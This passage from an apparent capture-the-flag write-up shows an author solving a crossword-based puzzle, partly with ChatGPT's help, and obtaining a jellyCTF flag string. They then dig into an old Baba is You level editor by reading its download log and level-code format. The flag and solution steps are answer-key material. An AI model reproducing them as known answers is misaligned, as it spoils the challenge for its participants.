class="c0">15</span><span class="c3">&nbsp; &nbsp; Co. that purchased AT&amp;T in </span><span class="c0">2005</span><span class="c3"><br></span><span class="c0">17</span><span class="c3">&nbsp; &nbsp; Package delivery co. ticker symbol<br></span><span class="c0">18</span><span class="c3">&nbsp; &nbsp; Smoked salmon for breakfast<br></span><span class="c0">19</span><span class="c3">&nbsp; &nbsp; Killing your teammate, abbr.<br></span><span class="c0">20</span><span class="c3">&nbsp; &nbsp; What&#39;s that noise? Did someone __ me?<br></span><span class="c0">21</span><span class="c3">&nbsp; &nbsp; Yankovic</span></p></td></tr></table><p class="c18 c34"><span class="c7"></span></p><p class="c18"><span class="c7">Turns out ChatGPT is a crossword machine. I thought &ldquo;Dorian Gray Creator&rdquo; was E.L. James. Shows how literate I am.</span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 664.00px; height: 632.00px;"><img alt="" src="images/image42.png" style="width: 664.00px; height: 632.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span>Well I didn&rsquo;t quite understand all of the clues, but everything checks out.</span><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 696.49px; height: 340.12px;"><img alt="" src="images/image41.png" style="width: 696.49px; height: 340.12px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><h3 class="c5 c39" id="h.qdl3epqrlysq"><span class="c41 c32 c50">jellyCTF{kroddaerbasatalf}</span></h3><p class="c18"><span>Except, there&rsquo;s something missing. That </span><span class="c40">&ldquo;Last name of developer, released a free beta on itch.io needed to solve this challenge&rdquo; </span><span class="c7">clue tells me there&rsquo;s more work to be done. Well, that and the fact that the above code doesn&rsquo;t, and and one of the clue descriptions is &ldquo;I know what to do with the code and solved the thing it leads to. Why isn&#39;t the flag working? Where is the flag?&rdquo;. So, we&rsquo;ve got to find that thing on itch.io.</span></p><p class="c18"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 689.00px; height: 951.00px;"><img alt="" src="images/image29.png" style="width: 689.00px; height: 951.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c6 subtitle" id="h.61xrs93xblon"><span class="c19">Wow, really stellar work, ChatGPT.</span></p><p class="c18"><span class="c7">I think at this point trying random letters will get me there faster. I will cut out the embarrassing segment where I mistook the uppercase I for a lowercase L, just like I thought I would when I first wrote it.</span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 636.00px; height: 592.00px;"><img alt="" src="images/image20.gif" style="width: 636.00px; height: 592.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c6 subtitle" id="h.gzbo4nsrtfi6"><span class="c19">Another dead end, I think.</span></p><p class="c18"><span>Thankfully for the low price of 15 points, I can simply be </span><span class="c37"><a class="c28" href="https://www.google.com/url?q=https://hempuli.itch.io/baba-is-you-level-editor-beta&amp;sa=D&amp;source=editors&amp;ust=1719257876291314&amp;usg=AOvVaw0qLUS7djBmxxFt-_LjiGW9">told what to do</a></span><span class="c7">. It&rsquo;s an old version of the Baba is You level editor. There&rsquo;s nowhere to put the key, so we have to be a little more creative.</span></p><p class="c18"><span class="c7">Running the game from a terminal window, I notice some interesting stuff.<br></span></p><a id="t.a472e91c7cbee4d0a07dc2aab0136132614013a1"></a><a id="t.30"></a><table class="c11"><tr class="c13"><td class="c21" colspan="1" rowspan="1"><p class="c8"><span class="c14">babahttp_download:</span><span class="c3">&nbsp;</span><span class="c14">https:</span><span class="c20">//8778eno8ha.execute-api.eu-central-1.amazonaws.com/prod/list_levels2?category=featured&amp;page=36</span><span class="c3"><br></span><span class="c14">babahttp_download:</span><span class="c3">&nbsp;</span><span class="c14">https:</span><span class="c20">//babalevels3.s3.eu-central-1.amazonaws.com/9R9U-RXRK.png</span><span class="c3"><br></span><span class="c14">babahttp_download:</span><span class="c3">&nbsp;</span><span class="c14">https:</span><span class="c20">//babalevels3.s3.eu-central-1.amazonaws.com/44EI-DGJ5.png</span><span class="c3"><br></span><span class="c14">babahttp_download:</span><span class="c3">&nbsp;</span><span class="c14">https:</span><span class="c20">//babalevels3.s3.eu-central-1.amazonaws.com/9FZK-2YH7.png</span><span class="c3"><br></span><span class="c14">babahttp_download:</span><span class="c3">&nbsp;</span><span class="c14">https:</span><span class="c20">//babalevels3.s3.eu-central-1.amazonaws.com/NVYI-7PDX.png</span><span class="c3"><br></span><span class="c14">babahttp_download:</span><span class="c3">&nbsp;</span><span class="c14">https:</span><span class="c20">//babalevels3.s3.eu-central-1.amazonaws.com/TL42-MAFW.png</span><span class="c3"><br></span><span class="c14">babahttp_download:</span><span class="c3">&nbsp;</span><span class="c14">https:</span><span class="c20">//babalevels3.s3.eu-central-1.amazonaws.com/MKIE-6HKJ.png</span><span class="c3"><br>No INI cache found </span><span class="c16">for</span><span class="c3">&nbsp;.</span><span class="c2">/temp/</span><span class="c3">MKIE</span><span class="c0">-6</span><span class="c3">HKJ.png<br>No INI cache found </span><span class="c16">for</span><span class="c3">&nbsp;.</span><span class="c2">/temp/</span><span class="c0">9</span><span class="c3">R9U-RXRK.png<br>No INI cache found </span><span class="c16">for</span><span class="c3">&nbsp;.</span><span class="c2">/temp/</span><span class="c0">9</span><span class="c3">FZK</span><span class="c0">-2</span><span class="c3">YH7.png<br>No INI cache found </span><span class="c16">for</span><span class="c3">&nbsp;.</span><span class="c2">/temp/</span><span class="c3">TL42-MAFW.png<br>No INI cache found </span><span class="c16">for</span><span class="c3">&nbsp;.</span><span class="c2">/temp/</span><span class="c3">NVYI</span><span class="c0">-7</span><span class="c3">PDX.png<br>No INI cache found </span><span class="c16">for</span><span class="c3">&nbsp;.</span><span class="c2">/temp/</span><span class="c0">44</span><span class="c3">EI-DGJ5.png</span></p></td></tr></table><p class="c18"><span class="c7">It downloads the levels from the web, and each one has one of these 8-character alphanumeric codes attached to them. The flag I got from the crossword happens to be 16 characters.</span></p><p class="c5"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 664.00px; height: 369.00px;"><img alt="" src="images/image31.png" style="width: 664.00px; height: 369.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c18"><span>Unfortunately, </span><span class="c32 c35">KROD-DAER</span><span>&nbsp;and </span><span class="c32 c35">BASA-TALF</span><span>&nbsp;are not valid level codes. I&rsquo;ve also learned that the codes are case sensitive despite all being uppercase, and the hyphen is required. &nbsp;It&rsquo;s also worth remembering that </span><span class="c32 c35">kroddaerbasatalf</span><span class="c7">&nbsp;is not just a random string of letters, so it&rsquo;s unlikely to be used as a UUID anywhere that doesn&rsquo;t let you set a custom one.</span></p><p class="c18"><span>I tried using </span><span class="c32 c35">name=</span><span>&nbsp;instead of </span><span class="c32 c35">level=</span><span class="c7">&nbsp;to try and find a known level based on its name, no dice. This tells me the following things:</span></p><ul class="c63 lst-kix_rxxsvcdmji6t-0 start"><li class="c18 c42 li-bullet-0"><span class="c7">I need to get a Baba is You level using the above code</span></li><li class="c18 c42 li-bullet-0"><span class="c7">It&rsquo;s probably not related to the level code since the code is random</span></li><li class="c18 c42 li-bullet-0"><span class="c7">You can only find levels on the official host using a code, so the level probably isn&rsquo;t there</span></li><li class="c18 c42 li-bullet-0"><span class="c7">Even if the event organizers managed to get a hold of Arvi and get him to put a secret into to demo, it hasn&rsquo;t been updated since 2022, so we can probably rule that out.</span></li><li class="c18 c42 li-bullet-0"><span>So either the level code or the level itself must be somewhere else and I need to find it.</span></li></ul></body></html>